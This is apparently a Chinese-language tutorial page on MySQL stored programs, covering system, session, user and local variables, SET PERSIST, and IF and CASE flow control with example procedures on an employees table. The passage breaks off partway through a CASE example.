<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 为某个系统变量赋值</span><br><span class="line"># 方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@global</span>.变量名<span class="operator">=</span>变量值;</span><br><span class="line"># 方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> 变量名<span class="operator">=</span>变量值;</span><br><span class="line"></span><br><span class="line"># 为某个会话变量赋值</span><br><span class="line"># 方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.变量名<span class="operator">=</span>变量值;</span><br><span class="line"># 方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">SET</span> SESSION 变量名<span class="operator">=</span>变量值;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 全局系统变量：</span><br><span class="line"># 方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@global</span>.max_connections <span class="operator">=</span> <span class="number">161</span>;</span><br><span class="line"># 方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> max_connections <span class="operator">=</span> <span class="number">171</span>;</span><br><span class="line"># 针对于当前的数据库实例是有效的，一旦重启mysql服务，就失效了。</span><br><span class="line"></span><br><span class="line"># 会话系统变量：</span><br><span class="line"># 方式<span class="number">1</span>：</span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.character_set_client <span class="operator">=</span> <span class="string">&#x27;gbk&#x27;</span>;</span><br><span class="line"># 方式<span class="number">2</span>：</span><br><span class="line"><span class="keyword">SET</span> SESSION character_set_client <span class="operator">=</span> <span class="string">&#x27;gbk&#x27;</span>;</span><br><span class="line"># 针对于当前会话是有效的，一旦结束会话，重新建立起新的会话，就失效了。</span><br></pre></td></tr></table></figure>


<h2 id="（3）MySQL-8-0的新特性—全局变量的持久化"><a href="#（3）MySQL-8-0的新特性—全局变量的持久化" class="headerlink" title="（3）MySQL 8.0的新特性—全局变量的持久化"></a>（3）MySQL 8.0的新特性—全局变量的持久化</h2><p>在MySQL数据库中，全局变量可以通过<code>SET GLOBAL</code>语句来设置。例如，设置服务器语句超时的限制，可以通过设置系统变量<code>max_execution_time</code>来实现：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> MAX_EXECUTION_TIME<span class="operator">=</span><span class="number">2000</span>;</span><br></pre></td></tr></table></figure>
<p>使用<code>SET GLOBAL</code>语句设置的变量值只会 <strong>临时生效</strong> 。 <strong>数据库重启</strong> 后，服务器又会从MySQL配置文件中读取变量的默认值。 MySQL 8.0版本新增了 <code>SET PERSIST</code> 命令。例如，设置服务器的最大连接数为1000：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> PERSIST <span class="keyword">GLOBAL</span> max_connections <span class="operator">=</span> <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>
<p>MySQL会将该命令的配置保存到数据目录下的 <code>mysqld-auto.cnf</code> 文件中，下次启动时会读取该文件，用其中的配置来覆盖默认的配置文件。</p>
<h2 id="2-用户自定义变量"><a href="#2-用户自定义变量" class="headerlink" title="2. 用户自定义变量"></a>2. 用户自定义变量</h2><h3 id="（1）用户变量分类"><a href="#（1）用户变量分类" class="headerlink" title="（1）用户变量分类"></a>（1）用户变量分类</h3><p>用户变量是用户自己定义的，MySQL 中的用户变量以 一个<code>@</code>开头。根据作用<br>范围不同，又分为 <strong>会话用户变量</strong> 和 <strong>局部变量</strong> 。</p>
<ul>
<li><strong>会话用户变量</strong>：作用域和会话变量一样，只对 <strong>当前连接</strong> 会话有效。</li>
<li><strong>局部变量</strong>：只在 <code>BEGIN</code> 和 <code>END</code> 语句块中有效。局部变量只能在 <strong>存储过程和函数</strong> 中使用。</li>
</ul>
<h3 id="（1）会话用户变量"><a href="#（1）会话用户变量" class="headerlink" title="（1）会话用户变量"></a>（1）会话用户变量</h3><ul>
<li>变量的定义</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 方式<span class="number">1</span>：&quot;=&quot; 或 &quot;:=&quot;</span><br><span class="line"><span class="keyword">SET</span> @用户变量 <span class="operator">=</span> 值;</span><br><span class="line"><span class="keyword">SET</span> @用户变量 :<span class="operator">=</span> 值;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：&quot;:=&quot; 或 <span class="keyword">INTO</span>关键字</span><br><span class="line"><span class="keyword">SELECT</span> @用户变量 :<span class="operator">=</span> 表达式 [<span class="keyword">FROM</span> 等子句];</span><br><span class="line"><span class="keyword">SELECT</span> 表达式 <span class="keyword">INTO</span> @用户变量 [<span class="keyword">FROM</span> 等子句];</span><br></pre></td></tr></table></figure>

<ul>
<li>查看用户变量的值 （查看、比较、运算等）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @用户变量</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 方式<span class="number">1</span>：&quot;=&quot; 或 &quot;:=&quot;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@m1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@m2</span> :<span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> <span class="variable">@sum</span> :<span class="operator">=</span> <span class="variable">@m1</span> <span class="operator">+</span> <span class="variable">@m2</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@sum</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@sum</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：&quot;:=&quot; 或 <span class="keyword">INTO</span>关键字</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@count</span> :<span class="operator">=</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> employees;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@count</span> :<span class="operator">=</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">107</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@count</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@count</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> <span class="variable">@avg_sal</span> <span class="keyword">FROM</span> employees;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@avg_sal</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@avg_sal</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6461.682242990654</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<h3 id="（3）局部变量"><a href="#（3）局部变量" class="headerlink" title="（3）局部变量"></a>（3）局部变量</h3><ul>
<li>定义：可以使用 <code>DECLARE</code> 语句定义一个局部变量</li>
<li>作用域：仅仅在定义它的 BEGIN … END 中有效</li>
<li>位置：只能放在 <code>BEGIN ... END</code> 中，而且<strong>只能放在第一句</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# 声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> 变量名<span class="number">1</span> 变量数据类型 [<span class="keyword">DEFAULT</span> 变量默认值];</span><br><span class="line">	<span class="keyword">DECLARE</span> 变量名<span class="number">2</span>,变量名<span class="number">3</span>,... 变量数据类型 [<span class="keyword">DEFAULT</span> 变量默认值];</span><br><span class="line">	# 为局部变量赋值</span><br><span class="line">	<span class="keyword">SET</span> 变量名<span class="number">1</span> <span class="operator">=</span> 值;</span><br><span class="line">	<span class="keyword">SELECT</span> 值 <span class="keyword">INTO</span> 变量名<span class="number">2</span> [<span class="keyword">FROM</span> 子句];</span><br><span class="line">	# 查看局部变量的值</span><br><span class="line">	<span class="keyword">SELECT</span> 变量<span class="number">1</span>,变量<span class="number">2</span>,变量<span class="number">3</span>;</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<p><strong>1. 定义变量</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> 变量名 类型 [<span class="keyword">default</span> 值]; # 如果没有<span class="keyword">DEFAULT</span>子句，初始值为<span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
<p><strong>2. 变量赋值</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 方式<span class="number">1</span>：一般用于赋简单的值</span><br><span class="line"><span class="keyword">SET</span> 变量名<span class="operator">=</span>值;</span><br><span class="line"><span class="keyword">SET</span> 变量名:<span class="operator">=</span>值;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：一般用于赋表中的字段值</span><br><span class="line"><span class="keyword">SELECT</span> 字段名或表达式 <span class="keyword">INTO</span> 变量名 <span class="keyword">FROM</span> 表;</span><br></pre></td></tr></table></figure>

<p><strong>3.使用变量（查看、比较、运算等）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 局部变量名;</span><br></pre></td></tr></table></figure>

<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 举例<span class="number">1</span>：声明局部变量，并分别赋值为employees表中employee_id为<span class="number">102</span>的last_name和salary</span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_var()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# <span class="number">1.</span>声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> a <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">DECLARE</span> b <span class="type">INT</span> ;</span><br><span class="line">	#<span class="keyword">DECLARE</span> a,b <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">DECLARE</span> emp_name <span class="type">VARCHAR</span>(<span class="number">25</span>);</span><br><span class="line">	</span><br><span class="line">	# <span class="number">2.</span>赋值</span><br><span class="line">	<span class="keyword">SET</span> a <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">SET</span> b :<span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">SELECT</span> last_name <span class="keyword">INTO</span> emp_name <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">101</span>;</span><br><span class="line">	</span><br><span class="line">	# <span class="number">3.</span>使用</span><br><span class="line">	<span class="keyword">SELECT</span> a,b,emp_name;	</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用存储过程</span><br><span class="line"><span class="keyword">CALL</span> test_var();</span><br><span class="line"></span><br><span class="line"><span class="comment">--------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"># 举例<span class="number">2</span>：声明两个变量，求和并打印</span><br><span class="line"># 方式<span class="number">1</span>：使用会话用户变量</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@v1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@v2</span> :<span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@result</span> :<span class="operator">=</span> <span class="variable">@v1</span> <span class="operator">+</span> <span class="variable">@v2</span>;</span><br><span class="line"># 查看</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@result</span>;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：使用局部变量</span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> add_value()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# <span class="number">1.</span>声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> value1 <span class="type">INT</span> ;</span><br><span class="line">	<span class="keyword">DECLARE</span> value2 <span class="type">INT</span> ;</span><br><span class="line">	<span class="keyword">DECLARE</span> sum_val <span class="type">INT</span> ;</span><br><span class="line"></span><br><span class="line">	# <span class="number">2.</span>赋值</span><br><span class="line">	<span class="keyword">SET</span> value1 <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">SET</span> value2 :<span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">SET</span> sum_val <span class="operator">=</span> value1 <span class="operator">+</span> value2;</span><br><span class="line">	# <span class="number">3.</span>使用</span><br><span class="line">	<span class="keyword">SELECT</span> sum_val;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用存储过程</span><br><span class="line"><span class="keyword">CALL</span> add_value();</span><br><span class="line"></span><br><span class="line"># 若想在调用存储过程时输入value1与value2的值，可如下定义</span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> add_value(<span class="keyword">IN</span> value1 <span class="type">INT</span>, <span class="keyword">IN</span> value2 <span class="type">INT</span>, <span class="keyword">OUT</span> sum_val <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	<span class="keyword">SET</span> sum_val <span class="operator">=</span> value1 <span class="operator">+</span> value2;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用存储过程</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@sum_val</span> :<span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">CALL</span> add_value(<span class="number">3</span>, <span class="number">4</span>, <span class="variable">@sum_val</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@sum_val</span>;</span><br></pre></td></tr></table></figure>

<p><strong>对比会话用户变量与局部变量</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815134819.png" alt=" "></p>
<hr>
<h1 id="二、-定义条件与处理程序"><a href="#二、-定义条件与处理程序" class="headerlink" title="二、 定义条件与处理程序"></a>二、 定义条件与处理程序</h1><p><strong>定义条件</strong> 是事先定义程序执行过程中可能遇到的问题， <strong>处理程序</strong> 定义了在遇到问题时应当采取的处理方式，并且保证存储过程或函数在遇到警告或错误时能继续执行。这样可以增强存储程序处理问题的能力，避免程序异常停止运行。</p>
<p><strong>说明</strong>：定义条件和处理程序在存储过程、存储函数中都是支持的。</p>
<hr>
<h1 id="三、流程控制"><a href="#三、流程控制" class="headerlink" title="三、流程控制"></a>三、流程控制</h1><p>解决复杂问题不可能通过一个 SQL 语句完成，我们需要执行多个 SQL 操作。流程控制语句的作用就是控制存储过程中 SQL 语句的执行顺序，是我们完成复杂操作必不可少的一部分。只要是执行的程序，流程就分为三大类：</p>
<ul>
<li><strong>顺序结构</strong> ：程序从上往下依次执行</li>
<li><strong>分支结构</strong> ：程序按条件进行选择执行，从两条或多条路径中选择一条执行</li>
<li><strong>循环结构</strong> ：程序满足一定条件下，重复执行一组语句</li>
</ul>
<p>针对于MySQL 的流程控制语句主要有 3 类。注意：<strong>只能用于存储程序</strong>。</p>
<ul>
<li><strong>条件判断语句</strong> ：IF 语句和 CASE 语句</li>
<li><strong>循环语句</strong> ：LOOP、WHILE 和 REPEAT 语句</li>
<li><strong>跳转语句</strong> ：ITERATE 和 LEAVE 语句</li>
</ul>
<h2 id="1-分支结构之-IF"><a href="#1-分支结构之-IF" class="headerlink" title="1. 分支结构之 IF"></a>1. 分支结构之 IF</h2><ul>
<li>IF 语句的语法结构</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">IF 表达式<span class="number">1</span> <span class="keyword">THEN</span> 操作<span class="number">1</span></span><br><span class="line">	[ELSEIF 表达式<span class="number">2</span> <span class="keyword">THEN</span> 操作<span class="number">2</span>]</span><br><span class="line">	……</span><br><span class="line">	[<span class="keyword">ELSE</span> 操作N]</span><br><span class="line"><span class="keyword">END</span> IF</span><br></pre></td></tr></table></figure>
<p>根据表达式的结果为TRUE或FALSE执行相应的语句。这里<code>[]</code>中的内容是可选的。</p>
<ul>
<li>特点：① 不同的表达式对应不同的操作 ② 使用在<code>BEGIN END</code>中</li>
</ul>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_if()</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">DECLARE</span> age <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">20</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	IF age <span class="operator">&gt;</span> <span class="number">40</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">THEN</span>  <span class="keyword">SELECT</span> <span class="string">&#x27;中老年&#x27;</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	ELSEIF age <span class="operator">&gt;</span> <span class="number">18</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">THEN</span>  <span class="keyword">SELECT</span> <span class="string">&#x27;青壮年&#x27;</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	ELSEIF age <span class="operator">&gt;</span> <span class="number">8</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>          <span class="keyword">THEN</span>  <span class="keyword">SELECT</span> <span class="string">&#x27;青少年&#x27;</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> 	 	<span class="keyword">ELSE</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>           <span class="keyword">SELECT</span> <span class="string">&#x27;婴幼儿&#x27;</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">END</span> IF;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">1.97</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> test_if();</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> 青壮年 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> 青壮年 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 举例<span class="number">2</span>：声明存储过程“update_salary_by_eid1”，定义<span class="keyword">IN</span>参数emp_id，输入员工编号。</span><br><span class="line"># 判断该员工薪资如果低于<span class="number">8000</span>元并且入职时间超过<span class="number">5</span>年，就涨薪<span class="number">500</span>元；否则就不变。</span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_by_eid1(<span class="keyword">IN</span> emp_id <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	# 声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> emp_sal <span class="keyword">DOUBLE</span>; # 记录员工的工资</span><br><span class="line">	<span class="keyword">DECLARE</span> hire_year <span class="keyword">DOUBLE</span>; # 记录员工入职公司的年头</span><br><span class="line">	# 赋值</span><br><span class="line">	<span class="keyword">SELECT</span> salary <span class="keyword">INTO</span> emp_sal <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">	<span class="keyword">SELECT</span> DATEDIFF(CURDATE(),hire_date)<span class="operator">/</span><span class="number">365</span> <span class="keyword">INTO</span> hire_year <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">	# 判断</span><br><span class="line">	IF emp_sal <span class="operator">&lt;</span> <span class="number">8000</span> <span class="keyword">AND</span> hire_year <span class="operator">&gt;=</span> <span class="number">5</span></span><br><span class="line">		<span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">500</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">	<span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用存储过程</span><br><span class="line"><span class="keyword">CALL</span> update_salary_by_eid1(<span class="number">104</span>);</span><br></pre></td></tr></table></figure>



<h2 id="2-分支结构之-CASE"><a href="#2-分支结构之-CASE" class="headerlink" title="2. 分支结构之 CASE"></a>2. 分支结构之 CASE</h2><ul>
<li>CASE 语句的语法结构1</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 情况一：类似于switch</span><br><span class="line"><span class="keyword">CASE</span> 表达式</span><br><span class="line">	<span class="keyword">WHEN</span> 值<span class="number">1</span> <span class="keyword">THEN</span> 结果<span class="number">1</span>或语句<span class="number">1</span>(如果是语句，需要加分号)</span><br><span class="line">	<span class="keyword">WHEN</span> 值<span class="number">2</span> <span class="keyword">THEN</span> 结果<span class="number">2</span>或语句<span class="number">2</span>(如果是语句，需要加分号)</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">ELSE</span> 结果n或语句n(如果是语句，需要加分号)</span><br><span class="line"><span class="keyword">END</span> [<span class="keyword">case</span>]（如果是放在<span class="keyword">begin</span> <span class="keyword">end</span>中需要加上<span class="keyword">case</span>，如果放在<span class="keyword">select</span>后面不需要）</span><br></pre></td></tr></table></figure>


<ul>
<li>CASE 语句的语法结构2</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 情况二：类似于多重if</span><br><span class="line"><span class="keyword">CASE</span></span><br><span class="line">	<span class="keyword">WHEN</span> 条件<span class="number">1</span> <span class="keyword">THEN</span> 结果<span class="number">1</span>或语句<span class="number">1</span>(如果是语句，需要加分号)</span><br><span class="line">	<span class="keyword">WHEN</span> 条件<span class="number">2</span> <span class="keyword">THEN</span> 结果<span class="number">2</span>或语句<span class="number">2</span>(如果是语句，需要加分号)</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">ELSE</span> 结果n或语句n(如果是语句，需要加分号)</span><br><span class="line"><span class="keyword">END</span> [<span class="keyword">case</span>]（如果是放在<span class="keyword">begin</span> <span class="keyword">end</span>中需要加上<span class="keyword">case</span>，如果放在<span class="keyword">select</span>后面不需要）</span><br></pre></td></tr></table></figure>


<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> test_case()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	<span class="keyword">DECLARE</span> var1 <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">10</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">CASE</span> </span><br><span class="line">	<span class="keyword">WHEN</span> var1 <span class="operator">&gt;=</span> <span class="number">100</span> <span class="keyword">THEN</span> <span class="keyword">SELECT</span> <span class="string">&#x27;多位数&#x27;</span>;</span><br><span class="line">	<span class="keyword">WHEN</span> var1 <span class="operator">&gt;=</span> <span class="number">10</span> <span class="keyword">THEN</span> <span class="keyword">SELECT</span> <span class="string">&#x27;两位数&#x27;</span>;</span><br><span class="line">	<span class="keyword">ELSE</span> <span class="keyword">SELECT</span> <span class="string">&#x27;个数位&#x27;</span>;</span><br><span class="line">	<span class="keyword">END</span> <span class="keyword">CASE</span>;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"># 调用</span><br><span class="line"><span class="keyword">CALL</span> test_case();</span><br><span class="line"></span><br><span class="line"># 举例<span class="number">2</span>：声明存储过程update_salary_by_eid5，定义<span class="keyword">IN</span>参数emp_id，输入员工编号。</span><br><span class="line"># 判断该员工的入职年限，如果是<span class="number">0</span>年，薪资涨<span class="number">50</span>；如果是<span class="number">1</span>年，薪资涨<span class="number">100</span>；</span><br><span class="line"># 如果是<span class="number">2</span>年，薪资涨<span class="number">200</span>；如果是<span class="number">3</span>年，薪资涨<span class="number">300</span>；如果是<span class="number">4</span>年，薪资涨<span class="number">400</span>；其他的涨薪<span class="number">500</span>。</span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_by_eid5(<span class="keyword">IN</span> emp_id <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	#声明局部变量</span><br><span class="line">	<span class="keyword">DECLARE</span> hire_year <span class="type">INT</span>; #记录员工入职公司的总时间（单位：年）</span><br><span class="line">	</span><br><span class="line">	#赋值</span><br><span class="line">	<span class="keyword">SELECT</span> ROUND(DATEDIFF(CURDATE(),hire_date) <span class="operator">/</span> <span class="number">365</span>) <span class="keyword">INTO</span> hire_year </span><br><span class="line">	<span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">	</span><br><span class="line">	#判断</span><br><span class="line">	<span class="keyword">CASE</span> hire_year</span><br><span class="line">		<span class="keyword">WHEN</span> <span class="number">0</span> <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">50</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">		<span class="keyword">WHEN</span> <span class="number">1</span> <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">100</span> <span 